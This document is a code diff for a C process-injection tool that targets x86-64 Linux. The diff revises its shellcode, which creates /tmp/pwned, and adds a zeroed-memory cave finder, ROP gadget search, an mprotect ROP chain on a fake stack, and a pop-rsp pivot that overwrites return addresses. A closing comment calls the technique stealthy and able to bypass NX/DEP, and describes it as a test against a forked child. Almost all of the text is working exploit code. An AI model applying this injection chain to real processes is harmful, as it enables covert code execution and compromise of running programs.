@@ -10,25 +10,24 @@
 #include <sys/mman.h>
 
 unsigned char shellcode[] = {
-    0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
-    0xeb, 0x26,                    // jmp short get_path
-    // --- back: ---
-    0x5f,                          // pop rdi
-    0xb8, 0x02, 0x00, 0x00, 0x00,  // mov rax, 2          (open)
-    0xbe, 0x41, 0x00, 0x00, 0x00,  // mov esi, 0x41       (O_CREAT|O_WRONLY)
-    0xba, 0xa4, 0x01, 0x00, 0x00,  // mov edx, 0x1a4      (0644)
-    0x0f, 0x05,                    // syscall
-    0x48, 0x89, 0xc7,              // mov rdi, rax        (fd)
-    0xb8, 0x03, 0x00, 0x00, 0x00,  // mov rax, 3          (close)
-    0x0f, 0x05,                    // syscall
-    0xb8, 0x3c, 0x00, 0x00, 0x00,  // mov rax, 60         (exit)
-    0x48, 0x31, 0xff,              // xor rdi, rdi
-    0x0f, 0x05,                    // syscall
-    // --- get_path: ---
-    0xe8, 0xd5, 0xff, 0xff, 0xff,  // call back
-    0x2f, 0x74, 0x6d, 0x70, 0x2f,  // "/tmp/"
-    0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
-    0x00                          
+    // --- open("/tmp/pwned", O_CREAT|O_WRONLY, 0644) ---
+    0x48, 0x8d, 0x3d, 0x25, 0x00, 0x00, 0x00,  // lea rdi, [rip + 0x25]   ; path
+    0xb8, 0x02, 0x00, 0x00, 0x00,              // mov eax, 2              ; sys_open
+    0xbe, 0x41, 0x00, 0x00, 0x00,              // mov esi, 0x41           ; O_CREAT|O_WRONLY
+    0xba, 0xa4, 0x01, 0x00, 0x00,              // mov edx, 0x1a4          ; 0644
+    0x0f, 0x05,                                // syscall
+    // --- close(fd) ---
+    0x48, 0x89, 0xc7,                          // mov rdi, rax            ; fd
+    0xb8, 0x03, 0x00, 0x00, 0x00,              // mov eax, 3              ; sys_close
+    0x0f, 0x05,                                // syscall
+    // --- exit(0) ---
+    0xb8, 0x3c, 0x00, 0x00, 0x00,              // mov eax, 60             ; sys_exit
+    0x48, 0x31, 0xff,                          // xor rdi, rdi
+    0x0f, 0x05,                                // syscall
+    // --- path: ---
+    0x2f, 0x74, 0x6d, 0x70, 0x2f,              // "/tmp/"
+    0x70, 0x77, 0x6e, 0x65, 0x64,              // "pwned"
+    0x00                                       // '\0'
 };
 unsigned int shellcode_len = sizeof(shellcode);
 
@@ -147,106 +146,54 @@ long get_reg(pid_t pid, const char* reg) {
     return -1;
 }
 
-long find_memory_region(long pid, size_t required_len, const char *target_perms) {
-    char maps_file_name[64];
-    snprintf(maps_file_name, sizeof(maps_file_name), "/proc/%ld/maps", pid);
+long find_zeroed_writable_cave(pid_t pid, size_t required_len) {
+    char maps_path[256], mem_path[256];
+    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
+    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
 
-    FILE *maps_file = fopen(maps_file_name, "r");
-    if (maps_file == NULL) return -1;
+    FILE *maps_file = fopen(maps_path, "r");
+    int mem_fd = open(mem_path, O_RDONLY);
+    if (!maps_file || mem_fd < 0) {
+        if (maps_file) fclose(maps_file);
+        if (mem_fd >= 0) close(mem_fd);
+        return -1;
+    }
 
-    char *line = NULL;
-    size_t len = 0;
-    long found_address = -1;
+    char line[512];
+    long found_addr = -1;
+    unsigned char *zeros = calloc(1, required_len); 
 
-    while (getline(&line, &len, maps_file) != -1) {
+    while (fgets(line, sizeof(line), maps_file)) {
         long start, end;
         char perms[5];
-        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3) {
-            
-            // has this region all the permissions required?
-            int has_all_perms = 1;
-            for (int i = 0; target_perms[i] != '\0'; i++) {
-                if (strchr(perms, target_perms[i]) == NULL) {
-                    has_all_perms = 0;
-                    break;
-                }
-            }
-            
-            if (has_all_perms) {
-                // is this region, with the correct permission, big enough?
-                size_t region_size = (size_t)(end - start);
-                if (region_size >= required_len) {
-                    found_address = start;
-                    break;
-                }
+        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
+        if (perms[1] != 'w') continue;
+        
+        size_t size = end - start;
+        if (size < required_len) continue;
+        if (size > 1024 * 1024 * 5) size = 1024 * 1024 * 5; 
+
+        unsigned char *buffer = malloc(size);
+        if (!buffer) continue;
+
+        if (pread(mem_fd, buffer, size, start) > 0) {
+            unsigned char *match = memmem(buffer, size, zeros, required_len);
+            if (match) {
+                found_addr = start + (match - buffer);
+                free(buffer);
+                break;
             }
         }
+        free(buffer);
     }
-
-    free(line);
+    free(zeros);
     fclose(maps_file);
-    return found_address;
-}
-
-long find_return_address(long pid, long rsp) {
-    //read 128 element from the stack -> stack_dump
-    uint64_t stack_dump[128]; 
-    char mem_path[128];
-    snprintf(mem_path, sizeof(mem_path), "/proc/%ld/mem", pid);
-
-    int fd = open(mem_path, O_RDONLY);
-    if (fd < 0) return -1;
-
-    ssize_t bytes_read = pread(fd, stack_dump, sizeof(stack_dump), rsp);
-    close(fd);
-    if (bytes_read <= 0) return -1;
-    int num_elements = bytes_read / sizeof(uint64_t);
-
-    // read the memory of the process
-    char maps_file_name[128];
-    snprintf(maps_file_name, sizeof(maps_file_name), "/proc/%ld/maps", pid);
-    char *line = NULL;
-    size_t len = 0;
-    FILE *maps_file = fopen(maps_file_name, "r");
-    if (maps_file == NULL) return -1;
-
-    int best_index = 9999; // Track the index closest to RSP
-    long found_ret_addr_location = -1;
-
-    //for every region in the memory ...
-    while (getline(&line, &len, maps_file) != -1) {
-        long start_addr, end_addr;
-        char perms[5];
-
-        //has the scanf read 3 elements? (start_address)-(end_address) (perms) 
-        if (sscanf(line, "%lx-%lx %4s", &start_addr, &end_addr, perms) != 3)
-            continue;
-            
-        //has the region execute permission?
-        if (strchr(perms, 'x') == NULL)
-            continue;
-            
-        for (int i = 0; i < num_elements && i < best_index; i++) {
-            //...for every value in the stack...
-            uint64_t candidate_val = stack_dump[i];
-
-            //...does this value point to this region
-            if (candidate_val >= (uint64_t)start_addr && candidate_val < (uint64_t)end_addr) {
-                best_index = i; // new closest found
-                // compute static address
-                found_ret_addr_location = rsp + (i * sizeof(uint64_t));
-            }
-        }
-    }
-    free(line);
-    fclose(maps_file);
-    return found_ret_addr_location;
+    close(mem_fd);
+    return found_addr;
 }
 
 long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
-    char maps_path[256];
-    char mem_path[256];
-    
+    char maps_path[256], mem_path[256];
     snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
     snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
 
@@ -261,79 +208,95 @@ long find_gadgets(int pid, Gadget *gadgets, int num_gadgets) {
 
     size_t max_gadget_len = 0;
     for (int i = 0; i < num_gadgets; i++) {
-        if (gadgets[i].len > max_gadget_len) {
-            max_gadget_len = gadgets[i].len;
-        }
+        if (gadgets[i].len > max_gadget_len) max_gadget_len = gadgets[i].len;
     }
     size_t overlap = max_gadget_len - 1;
     unsigned char *buffer = malloc(CHUNK_SIZE);
     if (!buffer) {
-        fclose(maps_file);
-        close(mem_fd);
-        return -1;
+        fclose(maps_file); close(mem_fd); return -1;
     }
 
     char line[512];
     long found = 0;
 
-    // read the memory
     while (fgets(line, sizeof(line), maps_file)) {
         long start, end;
         char perms[5];
-        
-        //has the scanf read 3 elements? (start_address)-(end_address) (perms) 
-        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3)
-            continue;
-        
-        //has the region execute permission?
-        if (strchr(perms, 'x') == NULL)
-            continue;
+        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
+        if (strchr(perms, 'x') == NULL) continue;
 
         long current_addr = start;
         while (current_addr < end) {
             size_t bytes_to_read = end - current_addr;
-            if (bytes_to_read > CHUNK_SIZE) {
-                bytes_to_read = CHUNK_SIZE;
-            }
+            if (bytes_to_read > CHUNK_SIZE) bytes_to_read = CHUNK_SIZE;
 
             ssize_t bytes_read = pread(mem_fd, buffer, bytes_to_read, current_addr);
             if (bytes_read <= 0) break;
 
             for (int i = 0; i < num_gadgets; i++) {
                 if (gadgets[i].addr != 0) continue;
-                
                 unsigned char *match = memmem(buffer, bytes_read, gadgets[i].bytes, gadgets[i].len);
                 if (match) {
                     gadgets[i].addr = current_addr + (match - buffer);
                     found++;
                 }
             }
-
             if (found == num_gadgets) {
-                free(buffer);
-                fclose(maps_file);
-                close(mem_fd);
-                return found;
+                free(buffer); fclose(maps_file); close(mem_fd); return found;
             }
-
             if (current_addr + bytes_read < end) {
                 current_addr += (bytes_read - overlap);
-            } else
-                break; 
+            } else break; 
         }
     }
-
-    free(buffer);
-    fclose(maps_file);
-    close(mem_fd);
+    free(buffer); fclose(maps_file); close(mem_fd);
     return found;
 }
 
-uint64_t* build_rop_chain(long address, pid_t pid){
+int find_pop_rdx_variant(pid_t pid, uint64_t *out_addr, int *out_extra_pops) {
+    static const struct {
+        const uint8_t *bytes;
+        size_t         len;
+        int            extra_pops;
+        const char    *desc;
+    } variants[] = {
+        { (const uint8_t*)"\x5a\xc3",         2, 0, "pop rdx; ret" },
+        { (const uint8_t*)"\x5a\x5b\xc3",     3, 1, "pop rdx; pop rbx; ret" },
+        { (const uint8_t*)"\x5a\x5d\xc3",     3, 1, "pop rdx; pop rbp; ret" },
+        { (const uint8_t*)"\x5a\x5e\xc3",     3, 1, "pop rdx; pop rsi; ret" },
+        { (const uint8_t*)"\x5a\x5f\xc3",     3, 1, "pop rdx; pop rdi; ret" },
+        { (const uint8_t*)"\x5a\x41\x5c\xc3", 4, 1, "pop rdx; pop r12; ret" },
+        { (const uint8_t*)"\x5a\x41\x5d\xc3", 4, 1, "pop rdx; pop r13; ret" },
+        { (const uint8_t*)"\x5a\x41\x5e\xc3", 4, 1, "pop rdx; pop r14; ret" },
+        { (const uint8_t*)"\x5a\x41\x5f\xc3", 4, 1, "pop rdx; pop r15; ret" },
+    };
+    int n = sizeof(variants) / sizeof(variants[0]);
+
+    Gadget candidates[n];
+    for (int i = 0; i < n; i++) {
+        candidates[i].bytes = variants[i].bytes;
+        candidates[i].len   = variants[i].len;
+        candidates[i].addr  = 0;
+    }
+
+    find_gadgets(pid, candidates, n);
+
+    for (int i = 0; i < n; i++) {
+        if (candidates[i].addr != 0) {
+            *out_addr       = candidates[i].addr;
+            *out_extra_pops = variants[i].extra_pops;
+            printf("[+] %-26s @ 0x%lx  (dummies=%d)\n",
+                   variants[i].desc, *out_addr, *out_extra_pops);
+            return 0;
+        }
+    }
+    return -1;
+}
+
+uint64_t* build_mprtect_rop_chain(long address, pid_t pid, size_t region_size, size_t *out_count) {
     Gadget gadgets[] = {
         { (uint8_t*)"\x5f\xc3",         2, 0 }, // pop rdi; ret
         { (uint8_t*)"\x5e\xc3",         2, 0 }, // pop rsi; ret
-        { (uint8_t*)"\x5a\xc3",         2, 0 }, // pop rdx; ret
         { (uint8_t*)"\x58\xc3",         2, 0 }, // pop rax; ret
         { (uint8_t*)"\x0f\x05\xc3",     3, 0 }, // syscall; ret
     };
@@ -341,42 +304,116 @@ uint64_t* build_rop_chain(long address, pid_t pid){
 
     int found = find_gadgets(pid, gadgets, n);
     if (found < n) {
-        fprintf(stderr, "[-] Not all gadgets found (%d/%d)\n", found, n);
+        fprintf(stderr, "[-] Not all base gadgets found (%d/%d)\n", found, n);
         return NULL;
     }
 
     uint64_t pop_rdi_ret = gadgets[0].addr;
     uint64_t pop_rsi_ret = gadgets[1].addr;
-    uint64_t pop_rdx_ret = gadgets[2].addr;
-    uint64_t pop_rax_ret = gadgets[3].addr;
-    uint64_t syscall_ret = gadgets[4].addr;
+    uint64_t pop_rax_ret = gadgets[2].addr;
+    uint64_t syscall_ret = gadgets[3].addr;
 
-    printf("[+] All gadgets found:\n");
-    printf("    pop rdi; ret -> 0x%lx\n", pop_rdi_ret);
-    printf("    pop rsi; ret -> 0x%lx\n", pop_rsi_ret);
-    printf("    pop rdx; ret -> 0x%lx\n", pop_rdx_ret);
-    printf("    pop rax; ret -> 0x%lx\n", pop_rax_ret);
-    printf("    syscall; ret -> 0x%lx\n", syscall_ret);
+    uint64_t pop_rdx_gadget = 0;
+    int      pop_rdx_extra  = 0;
+    if (find_pop_rdx_variant(pid, &pop_rdx_gadget, &pop_rdx_extra) != 0) {
+        fprintf(stderr, "[-] No pop rdx variant found in target libc\n");
+        return NULL;
+    }
 
-    uint64_t *rop_chain = malloc(10 * sizeof(uint64_t));
+    size_t count = 10 + (size_t)pop_rdx_extra;
+    uint64_t *rop_chain = malloc(count * sizeof(uint64_t));
     if (!rop_chain) return NULL;
 
-    long offset = address % CHUNK_SIZE;          // distance from the start of the page
-    long aligned_addr = address - offset;       // address of the page
-    long aligned_len = shellcode_len + offset;  // where the payload is gonna end in memory
+    long page_size    = sysconf(_SC_PAGESIZE);
+    long offset       = address % page_size;
+    long aligned_addr = address - offset;
+    long aligned_len  = region_size + offset;
 
-    rop_chain[0] = pop_rdi_ret;
-    rop_chain[1] = aligned_addr;                        // RDI
-    rop_chain[2] = pop_rsi_ret;
-    rop_chain[3] = aligned_len;                         // RSI
-    rop_chain[4] = pop_rdx_ret;
-    rop_chain[5] = PROT_READ | PROT_EXEC;               // RDX (r-x: 5)
-    rop_chain[6] = pop_rax_ret;
-    rop_chain[7] = 10;                                  // RAX (mprotect)
-    rop_chain[8] = syscall_ret;                         // executes mprotect
-    rop_chain[9] = address;
+    size_t i = 0;
+    rop_chain[i++] = pop_rdi_ret;
+    rop_chain[i++] = aligned_addr;                  // RDI
+    rop_chain[i++] = pop_rsi_ret;
+    rop_chain[i++] = aligned_len;                   // RSI
+    rop_chain[i++] = pop_rdx_gadget;
+    rop_chain[i++] = 5;                             // RDX
+    
+    for (int k = 0; k < pop_rdx_extra; k++) {
+        rop_chain[i++] = 0xdeadbeefdeadbeefULL;
+    }
+    
+    rop_chain[i++] = pop_rax_ret;
+    rop_chain[i++] = 10;                            // SYS_mprotect
+    rop_chain[i++] = syscall_ret;
+    rop_chain[i++] = address;                       // jump to shellcode
 
+    *out_count = i;
     return rop_chain;
+}
+
+int overwrite_possible_ret_addrs(pid_t pid, long rsp, unsigned char *buffer, size_t len) {
+    if (!buffer || len == 0) return -1;
+
+    char maps_path[256], mem_path[256];
+    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
+    snprintf(mem_path,  sizeof(mem_path),  "/proc/%d/mem",  pid);
+
+    FILE *maps_file = fopen(maps_path, "r");
+    if (!maps_file) return -1;
+
+    long region_starts[64];
+    long region_ends[64];
+    int n_regions = 0;
+    char *line = NULL;
+    size_t line_len = 0;
+
+    // gathering pointers to exec region
+    while (getline(&line, &line_len, maps_file) != -1 && n_regions < 64) {
+        long start, end;
+        char perms[5];
+        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
+        if (strchr(perms, 'x') == NULL) continue;
+        region_starts[n_regions] = start;
+        region_ends[n_regions]   = end;
+        n_regions++;
+    }
+    free(line);
+    fclose(maps_file);
+
+    if (n_regions == 0) return -1;
+
+    uint64_t stack_dump[128];
+    int fd = open(mem_path, O_RDONLY);
+    if (fd < 0) return -1;
+    ssize_t bytes_read = pread(fd, stack_dump, sizeof(stack_dump), rsp);
+    close(fd);
+    if (bytes_read <= 0) return -1;
+
+    int num_elements = bytes_read / sizeof(uint64_t);
+
+    // check exec region and overwriting
+    int overwritten = 0;
+    for (int i = 0; i < num_elements; i++) {
+        uint64_t current_val = stack_dump[i];
+        if (current_val  < 0x400000) continue;
+        // exec memory check
+        int in_exec = 0;
+        for (int r = 0; r < n_regions; r++) {
+            if (current_val >= (uint64_t)region_starts[r] && current_val < (uint64_t)region_ends[r]) {
+                in_exec = 1;
+                break;
+            }
+        }
+        if (!in_exec) continue;
+
+        long slot_addr = rsp + (long)i * sizeof(uint64_t);
+        ssize_t w = write_in_mem(slot_addr, pid, buffer, len);
+        if (w != (ssize_t)len) {
+            fprintf(stderr, "[!] Failed overwrite at rsp+0x%lx\n", (long)i * sizeof(uint64_t));
+            continue;
+        }
+        overwritten++;
+    }
+    return overwritten;
 }
 
 
@@ -388,97 +425,116 @@ int main(int argc, char *argv[]) {
     }
     printf("[+] target PID: %d\n", pid);
 
-    //inject the payload to a writable memory region without execution permissions
-    long target_address = find_memory_region(pid, shellcode_len, "w");
+    Gadget pivot_gadget = { (const uint8_t *)"\x5c\xc3", 2, 0 }; // pop rsp; ret
+    if (find_gadgets(pid, &pivot_gadget, 1) != 1) {
+        fprintf(stderr, "[-] Pivot gadget 'pop rsp; ret' not found\n");
+        exit(1);
+    }
+    printf("[+] Pivot gadget found at: 0x%lx\n", pivot_gadget.addr);
+    
+    // calculting necessary size to write the payload and the ROP chain
+    size_t aligned_sc_len = (shellcode_len + 7) & ~7; 
+    size_t rop_chain_size = 12 * sizeof(uint64_t);
+    size_t total_alloc_size = aligned_sc_len + rop_chain_size;
+
+    long target_address = find_zeroed_writable_cave(pid, total_alloc_size);
     if (target_address == -1) {
         fprintf(stderr, "[-] Writable memory region not found\n");
         exit(1);
     }
+    long shellcode_addr = target_address;
+    long fake_stack_addr = target_address + aligned_sc_len;
     printf("[+] Writable memory region found at: 0x%lx\n", target_address);
-
-    unsigned char MemRegion[shellcode_len];
-    if (read_mem(MemRegion, pid, target_address, shellcode_len) != 0) 
-        fprintf(stderr, "[!] Warning: failed to read memory\n");
-    printf("[+] memory region content before the overwrite: \n");
-    print_mem(MemRegion, shellcode_len);
-
-    if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
+    
+    // writing the shellcode
+    if (write_in_mem(shellcode_addr, pid, (unsigned char *)shellcode, shellcode_len) != (ssize_t)shellcode_len) {
         fprintf(stderr, "[-] Failed to write payload into memory region\n");
         exit(1);
     }
-    printf("[+] Payload written successfully\n");
 
-    if (read_mem(MemRegion, pid, target_address, shellcode_len) != 0) 
+    unsigned char MemRegion[shellcode_len];
+    printf("[+] payload written succefully\n");
+    if (read_mem(MemRegion, pid, shellcode_addr, shellcode_len) != 0) 
         fprintf(stderr, "[!] Warning: failed to read memory\n");
     printf("[+] memory region content after the overwrite: \n");
     print_mem(MemRegion, shellcode_len);
 
-    // Construct a ROP chain to call mprotect and mark the memory region of our shellcode executable
-    uint64_t *rop_chain = build_rop_chain(target_address, pid);
+    // building the rop chain
+    size_t rop_count = 0;
+    uint64_t *rop_chain = build_mprtect_rop_chain(shellcode_addr, pid, total_alloc_size, &rop_count);
     if (rop_chain == NULL) {
         fprintf(stderr, "[-] ROP chain construction failed\n");
         exit(1);
     }
-    size_t rop_chain_size = 10 * sizeof(uint64_t); //10 gadget in the ROP chain
-    printf("[+] ROP chain successfully built\n");
+    printf("[+] ROP chain successfully built (Size: %zu QWORDs)\n", rop_count);
 
-    // gathering rsp, necessary to find the return address
+    // writing the rop chain
+    rop_chain_size = rop_count * sizeof(uint64_t);
+    if (write_in_mem(fake_stack_addr, pid, (unsigned char *)rop_chain, rop_chain_size) != (ssize_t)rop_chain_size) {
+        perror("write_in_mem rop_chain");
+        free(rop_chain);
+        return -1;
+    }
+    printf("[+] ROP chain written succefully at 0x%lx\n", fake_stack_addr);
+    free(rop_chain);
+
     long rsp = get_reg(pid, "rsp");
     if(rsp == -1) {
-        fprintf(stderr, "[-] Stack pointer not found\n");
+        return -1;
+    }
+    printf("[*] stack pointer: 0x%lx\n", rsp);
+
+    size_t stack_scan_size = 1024;
+    uint64_t *stack_dump = malloc(stack_scan_size);
+    
+    // gathering stack
+    if (read_mem(stack_dump, pid, rsp, stack_scan_size) != 0) {
+        perror("read_mem stack dump");
+        free(stack_dump);
         exit(1);
     }
-    printf("[+] Stack pointer: 0x%lx\n",rsp);
 
-    // gathering return address
-    long return_address = find_return_address(pid, rsp); 
-    if(return_address == -1) {
-        fprintf(stderr, "[-] Return address not found\n");
+    uint64_t trampoline[2];
+    trampoline[0] = pivot_gadget.addr;        
+    trampoline[1] = fake_stack_addr;     
+
+    // overwrite all possible return address candidates
+    int n = overwrite_possible_ret_addrs(pid, rsp, (unsigned char *)&trampoline, sizeof(trampoline));
+    if (n <= 0) {
+        fprintf(stderr, "[-] No executable pointers overwritten on stack\n");
         exit(1);
     }
-    printf("[+] Return address: 0x%lx\n",return_address);
-
-    // Overwrite the return address in the stack with the ROP chain
-    ssize_t ret = write_in_mem(return_address, pid, (unsigned char *)rop_chain, rop_chain_size);
-    free(rop_chain);
-    if(ret != (ssize_t)rop_chain_size) {
-        fprintf(stderr, "[-] Failed to overwrite the return address\n");
-        exit(1);
-    }
-    printf("[+] Return address overwritten successfully with the ROP chain\n");
-
-    unsigned char *buffer = malloc(rop_chain_size);
-    if (!buffer) {
-        fprintf(stderr, "[!] Warning: malloc failed, skipping post-overwrite dump\n");
-    } else {
-        if (read_mem(buffer, pid, return_address, rop_chain_size) != 0)
-            fprintf(stderr, "[!] Warning: failed to read memory of the ROP chain\n");
-        printf("[+] Return address location after the overwrite:\n");
-        print_mem(buffer, rop_chain_size);
-        free(buffer);
-    }
+    printf("[+] Overwrote %d executable pointer(s)\n", n);
 
     printf("[+] Injection finished\n");
     exit(0); 
 }
 
 /**
- * This technique performs control-flow hijacking via Return Address Overwriting.
- * It first identifies a (rw-) memory region by scanning /proc/<pid>/maps
- * and writes the shellcode into it through /proc/<pid>/mem.
- * It then builds the ROP chain to call mprotect to make the payload executable
- * After that it inspects the process stack (from the RSP register) to locate the saved return address.
- * By overwriting this stack location with the address of the code cave,
- * the moment the CPU executes the next RET instruction,
- * execution is redirected into the ROP chain, and from there to the payload.
+ * This technique performs control-flow hijacking via Targeted Stack Pivoting
+ * and Return Address Overwriting.
  * 
- * Compared to the simpler "code cave + return address overwrite" variant,
- * this technique does not require finding an executable code cave:
- * it can write the payload into any writable region (heap, .data)
- * and use a ROP chain to invoke mprotect and grant execution permissions before jumping into it.
- * This is useful when no suitable executable cave is available in the victim's mapping,
- * or in scenarios such as remote exploitation via buffer overflow,
- * where the attacker has control over the stack but not over arbitrary memory writes.
+ * It first identifies a safe, zero-filled writable (rw-) memory region (a "Zero Cave")
+ * by scanning /proc/<pid>/maps and /proc/<pid>/mem to avoid corrupting vital process data.
+ * It writes the shellcode into this cave and immediately follows it with a dynamically 
+ * constructed ROP chain, effectively creating a "Fake Stack".
+ * This ROP chain is built to invoke mprotect (granting execution permissions) and dynamically
+ * adapts to modern glibc constraints by padding multi-pop 'rdx' gadgets with dummy values.
+ * 
+ * After setting up the Fake Stack, it inspects the process stack (from the RSP register)
+ * to locate potential saved return addresses. Instead of writing the full ROP chain directly
+ * onto the target's stack, it overwrites these candidates with a minimal 16-byte "Trampoline"
+ * consisting of a stack pivot gadget (pop rsp; ret) and the address of the Fake Stack.
+ * The moment the CPU executes the next RET instruction, the stack pointer is pivoted,
+ * execution is safely redirected into the ROP chain, and from there to the payload.
+ * 
+ * Compared to a standard "ROP chain + return address overwrite" variant,
+ * this pivoting technique prevents catastrophic stack corruption caused by overlapping 
+ * payloads when multiple return addresses are clustered together. 
+ * Furthermore, by writing into a verified Zero Cave instead of arbitrary writable memory, 
+ * it guarantees that no active program variables are destroyed before the payload triggers.
+ * This makes the injection highly reliable, stealthy, and capable of bypassing NX/DEP 
+ * protections without risking immediate segmentation faults.
  * 
  * Note: this test forks a child process to use as the injection target.
  * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
